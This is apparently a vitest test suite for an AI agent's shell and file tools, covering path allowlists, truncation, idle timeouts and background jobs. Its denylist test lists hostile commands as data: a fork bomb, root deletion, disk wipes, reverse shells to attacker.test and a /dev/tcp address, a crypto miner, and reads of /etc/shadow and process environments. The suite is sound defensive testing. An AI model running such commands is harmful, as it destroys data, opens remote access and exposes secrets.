import assert from "node:assert/strict";
import { mkdtempSync, realpathSync, rmSync } from "node:fs";
import { mkdir, readFile, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { afterAll, test, vi } from "vitest";
import { bootstrapTestEnv } from "../../helpers/setup.js";

// realpath because os.tmpdir() can be a symlink — `pwd` inside the child
// reports the resolved path, and the allowlist compares resolved paths too
const workDir = realpathSync(mkdtempSync(path.join(tmpdir(), "skiff-work-")));
const extraDir = realpathSync(mkdtempSync(path.join(tmpdir(), "skiff-extra-")));
const outsideDir = realpathSync(
  mkdtempSync(path.join(tmpdir(), "skiff-outside-"))
);

bootstrapTestEnv();
process.env.SHELL_WORK_DIR = workDir;
// the trailing separator is deliberate: the allowlist has to survive a config
// value with an empty trailing entry
process.env.SHELL_ALLOWED_DIRS = `${extraDir}, `;

// captured before the fake clock is installed — every wait on a real child
// process exiting has to happen in real time
const realSetTimeout = globalThis.setTimeout;
const realSleep = (ms: number) =>
  new Promise<void>((resolve) => {
    realSetTimeout(resolve, ms);
  });

// The clock is faked before the import on purpose: shell.ts arms its job
// reaper with a module-level setInterval, so that timer only becomes
// controllable if the fake is already installed at load time. Everything else
// this suite steers — the 5s backgrounding window, the idle killer, the
// SIGKILL escalation — is created per call. Date is faked alongside so the
// reaper's 30-minute TTL is reachable. Child processes still run in real time;
// that is what realSleep is for.
vi.useFakeTimers({
  toFake: [
    "setTimeout",
    "clearTimeout",
    "setInterval",
    "clearInterval",
    "Date",
  ],
});

const { createShellTools } = await import("../../../src/ai/tools/shell.js");

const tools = createShellTools();
const toolOpts = { toolCallId: "shell-test", messages: [] } as never;

afterAll(() => {
  vi.useRealTimers();
  for (const dir of [workDir, extraDir, outsideDir]) {
    rmSync(dir, { recursive: true, force: true });
  }
});

// mirrored from shell.ts — not exported, but the timings are part of the
// contract the tool documents to the model
const BACKGROUND_AFTER_MS = 5000;
const REAPER_INTERVAL_MS = 60_000;
const JOB_TTL_MS = 30 * 60 * 1000;
const MAX_BACKGROUND_JOBS = 50;
// the schema caps `timeout` here; calling execute() directly skips the schema,
// so it is passed explicitly to keep the idle killer out of the reaper tests
const MAX_TIMEOUT_MS = 120_000;

interface ExecResult {
  error?: string;
  exitCode?: number;
  stdout?: string;
  stderr?: string;
  truncated?: boolean;
  backgrounded?: boolean;
  jobId?: string;
  message?: string;
}

interface JobResult {
  error?: string;
  hint?: string;
  status?: string;
  exitCode?: number;
  stdout?: string;
  stderr?: string;
  truncated?: boolean;
}

interface WriteResult {
  success?: boolean;
  error?: string;
}

interface ReadResult {
  content?: string;
  truncated?: boolean;
  error?: string;
}

function execShell(input: {
  command: string;
  timeout?: number;
  cwd?: string;
}): Promise<ExecResult> {
  return tools.shell_exec.execute?.(
    { timeout: 30_000, ...input },
    toolOpts
  ) as Promise<ExecResult>;
}

function jobStatus(jobId: string): Promise<JobResult> {
  return tools.shell_job_status.execute?.(
    { job_id: jobId },
    toolOpts
  ) as Promise<JobResult>;
}

function writeFileTool(input: {
  path: string;
  content: string;
  partial?: boolean;
  start_offset?: number;
  end_offset?: number;
}): Promise<WriteResult> {
  return tools.write_file.execute?.(
    { partial: false, start_offset: 0, ...input },
    toolOpts
  ) as Promise<WriteResult>;
}

function readFileTool(input: {
  path: string;
  start?: number;
  end?: number;
}): Promise<ReadResult> {
  return tools.read_file.execute?.(
    { start: 0, ...input },
    toolOpts
  ) as Promise<ReadResult>;
}

/* ------------------------------------------------------------------ */
/* write_file                                                          */
/* ------------------------------------------------------------------ */

test("write_file creates a file inside the working directory", async () => {
  const target = path.join(workDir, "hello.txt");
  const result = await writeFileTool({ path: target, content: "hello world" });

  assert.deepEqual(result, { success: true });
  assert.equal(await readFile(target, "utf-8"), "hello world");
});

test("write_file also accepts an explicitly allowed directory", async () => {
  const target = path.join(extraDir, "nested", "deep.txt");
  await mkdir(path.dirname(target), { recursive: true });

  assert.deepEqual(await writeFileTool({ path: target, content: "ok" }), {
    success: true,
  });
  assert.equal(await readFile(target, "utf-8"), "ok");
});

test("write_file refuses paths outside the allowed directories", async () => {
  for (const target of [
    "/etc/passwd",
    path.join(outsideDir, "x.txt"),
    // traversal out of the work dir resolves outside it and is caught
    `${workDir}/../escaped.txt`,
    // a sibling whose name merely starts with the work dir is not inside it
    `${workDir}-sibling/x.txt`,
  ]) {
    const result = await writeFileTool({ path: target, content: "nope" });
    assert.equal(result.success, undefined, target);
    assert.match(result.error ?? "", /is not in the allowed directory list/);
  }
});

test("a partial write replaces only the requested line range", async () => {
  const target = path.join(workDir, "partial.txt");
  await writeFile(target, "a\nb\nc\nd\ne", "utf-8");

  const result = await writeFileTool({
    path: target,
    content: "B\nC",
    partial: true,
    start_offset: 1,
    end_offset: 3,
  });

  assert.deepEqual(result, { success: true });
  assert.equal(await readFile(target, "utf-8"), "a\nB\nC\nd\ne");
});

test("a partial write without an end offset rewrites the tail", async () => {
  const target = path.join(workDir, "tail.txt");
  await writeFile(target, "a\nb\nc\nd", "utf-8");

  await writeFileTool({
    path: target,
    content: "TAIL",
    partial: true,
    start_offset: 2,
  });

  assert.equal(await readFile(target, "utf-8"), "a\nb\nTAIL");
});

test("a partial write clamps an end offset past the last line", async () => {
  const target = path.join(workDir, "clamp.txt");
  await writeFile(target, "a\nb", "utf-8");

  await writeFileTool({
    path: target,
    content: "Z",
    partial: true,
    start_offset: 1,
    end_offset: 9999,
  });

  assert.equal(await readFile(target, "utf-8"), "a\nZ");
});

test("a partial write to a file that does not exist starts from empty", async () => {
  const target = path.join(workDir, "fresh-partial.txt");

  await writeFileTool({
    path: target,
    content: "first",
    partial: true,
    start_offset: 0,
  });

  assert.equal(await readFile(target, "utf-8"), "first");
});

test("write_file reports the underlying failure instead of throwing", async () => {
  // the work dir itself is allowed, but writing to a directory is EISDIR
  const result = await writeFileTool({ path: workDir, content: "nope" });

  assert.equal(result.success, undefined);
  assert.match(result.error ?? "", /^Failed to write file/);
  assert.match(result.error ?? "", /EISDIR|illegal operation on a directory/i);
});

/* ------------------------------------------------------------------ */
/* read_file                                                           */
/* ------------------------------------------------------------------ */

test("read_file returns the whole file by default", async () => {
  const target = path.join(workDir, "read-all.txt");
  await writeFile(target, "one\ntwo\nthree", "utf-8");

  assert.deepEqual(await readFileTool({ path: target }), {
    content: "one\ntwo\nthree",
    truncated: false,
  });
});

test("read_file slices the requested line range", async () => {
  const target = path.join(workDir, "read-slice.txt");
  await writeFile(target, "l0\nl1\nl2\nl3\nl4", "utf-8");

  assert.equal(
    (await readFileTool({ path: target, start: 1, end: 3 })).content,
    "l1\nl2"
  );
  // an end past the last line is clamped rather than padded
  assert.equal(
    (await readFileTool({ path: target, start: 3, end: 999 })).content,
    "l3\nl4"
  );
});

test("read_file refuses paths outside the allowed directories", async () => {
  const result = await readFileTool({ path: path.join(outsideDir, "x.txt") });

  assert.equal(result.content, undefined);
  assert.match(result.error ?? "", /is not in the allowed directory list/);
});

test("read_file reports a missing file instead of throwing", async () => {
  const result = await readFileTool({ path: path.join(workDir, "ghost.txt") });

  assert.equal(result.content, undefined);
  assert.match(result.error ?? "", /^Failed to read file/);
  assert.match(result.error ?? "", /ENOENT/);
});

test("read_file truncates content past the output cap", async () => {
  const target = path.join(workDir, "big.txt");
  await writeFile(target, "a".repeat(12_000), "utf-8");

  const result = await readFileTool({ path: target });

  assert.equal(result.truncated, true);
  assert.match(
    result.content ?? "",
    /\.\.\. \(output truncated, 2000 characters omitted\)$/
  );
  assert.ok(result.content?.startsWith("a".repeat(10_000)));
});

/* ------------------------------------------------------------------ */
/* denylist                                                            */
/* ------------------------------------------------------------------ */

test("dangerous commands are blocked before anything is spawned", async () => {
  const cases: [string, string][] = [
    [":(){ :|:& };:", "Fork bomb detected"],
    ["rm -rf /", "Recursive delete on root filesystem"],
    ["rm -fr /*", "Recursive delete on root filesystem"],
    ["dd if=/dev/zero of=/dev/sda bs=1M", "Disk wipe command detected"],
    ["mkfs.ext4 /dev/sda1", "Filesystem format command detected"],
    ["bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "Reverse shell detected"],
    ["nc attacker.test 4444 -e /bin/sh", "Reverse shell detected"],
    ["python3 -c 'import socket; s.connect((1,2))'", "Reverse shell detected"],
    ["perl -e 'socket(S); connect(S)'", "Reverse shell detected"],
    ["xmrig --url pool.test:3333", "Crypto miner detected"],
    ["cat /proc/self/environ", "Attempt to read process environment"],
    ["cat /proc/1234/environ", "Attempt to read process environment"],
    ["printenv", "Environment enumeration blocked"],
    ["declare -x", "Environment enumeration blocked"],
    ["env", "Environment enumeration blocked"],
    ["cat /etc/shadow", "Attempt to read sensitive system file"],
  ];

  for (const [command, reason] of cases) {
    const result = await execShell({ command });
    assert.equal(result.error, `Command blocked: ${reason}`, command);
    // nothing ran, so there is no exit code to report
    assert.equal(result.exitCode, undefined, command);
  }
});

test("a legitimate command that resembles a blocked one still runs", async () => {
  const scratch = path.join(workDir, "scratch");
  await mkdir(path.join(scratch, "inner"), { recursive: true });

  // "rm -rf <path>" only trips the denylist when the target is / itself
  const result = await execShell({ command: `rm -rf ${scratch}` });

  assert.equal(result.error, undefined);
  assert.equal(result.exitCode, 0);
  await assert.rejects(readFile(path.join(scratch, "inner"), "utf-8"));
});

/* ------------------------------------------------------------------ */
/* shell_exec — foreground                                             */
/* ------------------------------------------------------------------ */

test("shell_exec returns stdout and a zero exit code", async () => {
  const result = await execShell({ command: "echo hello" });

  assert.deepEqual(result, {
    exitCode: 0,
    stdout: "hello\n",
    stderr: "",
    truncated: false,
  });
});

test("a failing command surfaces its exit code and stderr", async () => {
  const result = await execShell({ command: "echo boom >&2; exit 3" });

  assert.equal(result.exitCode, 3);
  assert.equal(result.stdout, "");
  assert.equal(result.stderr, "boom\n");
});

test("the child environment carries safe variables but no secrets", async () => {
  const result = await execShell({
    command:
      'printf "PATH=%s|KEY=%s|TOKEN=%s" "$PATH" "$OPENAI_API_KEY" "$DISCORD_BOT_TOKEN"',
  });

  const [pathPart, keyPart, tokenPart] = (result.stdout ?? "").split("|");
  assert.ok(
    (pathPart ?? "").length > "PATH=".length,
    "PATH should reach the child"
  );
  assert.equal(keyPart, "KEY=");
  assert.equal(tokenPart, "TOKEN=");
});

test("commands run in the configured working directory by default", async () => {
  const result = await execShell({ command: "pwd" });

  assert.equal(result.stdout?.trim(), workDir);
});

test("cwd may point at any allowed directory", async () => {
  const result = await execShell({ command: "pwd", cwd: extraDir });

  assert.equal(result.stdout?.trim(), extraDir);
});

test("a cwd outside the allowed directories is rejected", async () => {
  const result = await execShell({ command: "pwd", cwd: outsideDir });

  assert.match(result.error ?? "", /is not in the allowed directory list/);
  // the error names what is allowed so the model can correct itself
  assert.match(result.error ?? "", new RegExp(workDir));
  assert.match(result.error ?? "", new RegExp(extraDir));
});

test("a spawn failure is reported instead of hanging", async () => {
  // the allowlist is a path check, not a stat — a missing subdirectory of the
  // work dir passes it and then fails at spawn time
  const result = await execShell({
    command: "echo hi",
    cwd: path.join(workDir, "does-not-exist"),
  });

  assert.equal(result.exitCode, 1);
  assert.match(result.stderr ?? "", /ENOENT/);
});

test("output past the cap is truncated and flagged", async () => {
  const result = await execShell({
    command: "i=0; while [ $i -lt 240 ]; do printf '%050d' 0; i=$((i+1)); done",
  });

  assert.equal(result.exitCode, 0);
  assert.equal(result.truncated, true);
  assert.match(
    result.stdout ?? "",
    /\.\.\. \(output truncated, 2000 characters omitted\)$/
  );
});

/* ------------------------------------------------------------------ */
/* shell_exec — idle timeout                                           */
/* ------------------------------------------------------------------ */

/**
 * A `sleep 30` that returns the instant the idle clock is advanced by 1000ms
 * proves the idle killer fired — the command never got to run its course —
 * and the result names the idle timeout so the model can act on it.
 */
test("a silent command is killed once the idle timeout elapses", async () => {
  const pending = execShell({ command: "sleep 30", timeout: 1000 });

  await vi.advanceTimersByTimeAsync(1000);
  const result = await pending;

  assert.equal(result.exitCode, 137);
  assert.equal(
    result.stderr,
    "Command was idle for 1000ms with no output and was terminated."
  );
  assert.equal(result.stdout, "");

  // the SIGKILL escalation fires 5s after the SIGTERM; the child is long gone
  // by then, and the escalation must not blow up on an exited process
  await vi.advanceTimersByTimeAsync(5000);
  await realSleep(20);
});

test("output keeps a slow command alive past its idle window", async () => {
  const pending = execShell({
    command: "date +%s; sleep 0.5; date +%s; sleep 0.5; date +%s",
    timeout: 1000,
  });

  // hold the clock still until the first line lands, then advance almost a
  // full idle window; each chunk of output rearms the timer from "now"
  await realSleep(250);
  await vi.advanceTimersByTimeAsync(900);
  await realSleep(500);
  await vi.advanceTimersByTimeAsync(900);

  const result = await pending;

  // 1800ms of idle budget consumed against a 1000ms timeout, yet it survived
  assert.equal(result.exitCode, 0);
  assert.equal(result.stdout?.trim().split("\n").length, 3);
}, 15_000);

/* ------------------------------------------------------------------ */
/* backgrounding + shell_job_status                                    */
/* ------------------------------------------------------------------ */

test("shell_job_status reports an unknown job id", async () => {
  assert.deepEqual(await jobStatus("no-such-job"), {
    error: "Job not found or already retrieved.",
  });
});

test("a command outliving the foreground window is backgrounded then completes", async () => {
  const pending = execShell({ command: "date +%Y; sleep 0.6" });

  await vi.advanceTimersByTimeAsync(BACKGROUND_AFTER_MS);
  const result = await pending;

  assert.equal(result.backgrounded, true);
  assert.match(result.jobId ?? "", /^[0-9a-f-]{36}$/);
  assert.ok(result.message?.includes(result.jobId ?? "never"));
  const jobId = result.jobId ?? "";

  // polling while it runs streams back whatever has been buffered so far
  await realSleep(250);
  const running = await jobStatus(jobId);
  assert.equal(running.status, "running");
  assert.match(running.stdout ?? "", /^\d{4}$/m);
  assert.equal(running.stderr, "");
  assert.match(running.hint ?? "", /schedule_task/);

  // once it finishes the job flips to done and carries the final result
  await realSleep(600);
  const done = await jobStatus(jobId);
  assert.equal(done.status, "done");
  assert.equal(done.exitCode, 0);
  assert.match(done.stdout ?? "", /^\d{4}$/m);
  assert.equal(done.truncated, false);

  // the result is handed over exactly once
  assert.deepEqual(await jobStatus(jobId), {
    error: "Job not found or already retrieved.",
  });
}, 15_000);

test("a backgrounded command that goes idle stops running and delivers a result", async () => {
  const pending = execShell({ command: "sleep 30", timeout: 8000 });

  await vi.advanceTimersByTimeAsync(BACKGROUND_AFTER_MS);
  const result = await pending;
  const jobId = result.jobId ?? "";
  assert.equal(result.backgrounded, true);

  // 3s more of silence crosses the 8s idle threshold
  await vi.advanceTimersByTimeAsync(3000);
  await realSleep(1000);

  // the idle kill surfaces as a termination, and the result is retrievable
  // exactly once
  const status = await jobStatus(jobId);
  assert.equal(status.status, "terminated");
  assert.equal(status.exitCode, 137);
  assert.match(status.stderr ?? "", /idle for 8000ms/);
  assert.deepEqual(await jobStatus(jobId), {
    error: "Job not found or already retrieved.",
  });

  await vi.advanceTimersByTimeAsync(5000);
  await realSleep(20);
}, 15_000);

/* ------------------------------------------------------------------ */
/* the background job reaper                                           */
/* ------------------------------------------------------------------ */

/**
 * Backgrounds `count` commands and returns their job ids. The children sleep
 * far longer than any test runs, so no amount of machine load can make one
 * exit before the backgrounding window is advanced — their lifetime is ended
 * deterministically by `finishAllViaIdleKill` instead.
 */
async function backgroundJobs(count: number): Promise<string[]> {
  const pending = Array.from({ length: count }, () =>
    execShell({ command: "sleep 300", timeout: MAX_TIMEOUT_MS })
  );
  await vi.advanceTimersByTimeAsync(BACKGROUND_AFTER_MS);
  const results = await Promise.all(pending);
  const ids = results.map((r) => r.jobId ?? "");
  assert.equal(new Set(ids).size, count, "every job gets its own id");
  return ids;
}

/**
 * Fires every job's idle killer by advancing past the idle timeout, then
 * gives the real SIGTERM deaths a moment to settle. Jobs finish while the
 * fake clock stands still, so they all share one `finishedAt` and the
 * reaper's oldest-first order stays insertion order.
 */
async function finishAllViaIdleKill(): Promise<void> {
  await vi.advanceTimersByTimeAsync(MAX_TIMEOUT_MS);
  await realSleep(1000);
}

test("the reaper trims finished jobs back to the cap, oldest first", async () => {
  const ids = await backgroundJobs(MAX_BACKGROUND_JOBS + 5);

  // a sweep while everything is still running must not touch anything: a
  // running job has no result to hand back yet
  await vi.advanceTimersByTimeAsync(REAPER_INTERVAL_MS);
  assert.equal((await jobStatus(ids[0] ?? "")).status, "running");

  // now that they have all finished, the next sweep drops the overflow
  await finishAllViaIdleKill();
  await vi.advanceTimersByTimeAsync(REAPER_INTERVAL_MS);

  const missing: string[] = [];
  for (const id of ids) {
    if ((await jobStatus(id)).error) missing.push(id);
  }

  assert.equal(missing.length, 5);
  assert.deepEqual(missing, ids.slice(0, 5));
}, 20_000);

test("finished jobs expire once their TTL is up", async () => {
  const ids = await backgroundJobs(2);
  await finishAllViaIdleKill();

  // well short of the TTL, the results are still waiting to be collected
  await vi.advanceTimersByTimeAsync(REAPER_INTERVAL_MS);
  assert.equal((await jobStatus(ids[0] ?? "")).status, "terminated");

  await vi.advanceTimersByTimeAsync(JOB_TTL_MS + REAPER_INTERVAL_MS);
  assert.deepEqual(await jobStatus(ids[1] ?? ""), {
    error: "Job not found or already retrieved.",
  });
}, 20_000);
